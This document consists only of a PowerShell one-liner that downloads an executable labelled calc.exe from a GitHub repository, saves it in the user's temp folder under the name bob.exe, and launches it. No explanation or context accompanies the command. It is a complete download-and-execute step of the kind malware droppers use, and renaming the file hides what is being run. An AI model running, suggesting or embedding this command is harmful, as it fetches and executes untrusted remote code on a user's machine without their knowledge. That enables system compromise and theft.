(new-object System.Net.WebClient).DownloadFile('https://github.com/Sir4h/public_489321234/raw/master/calc.exe', "$env:temp\bob.exe");Start-Process -filepath "$env:temp\bob.exe"
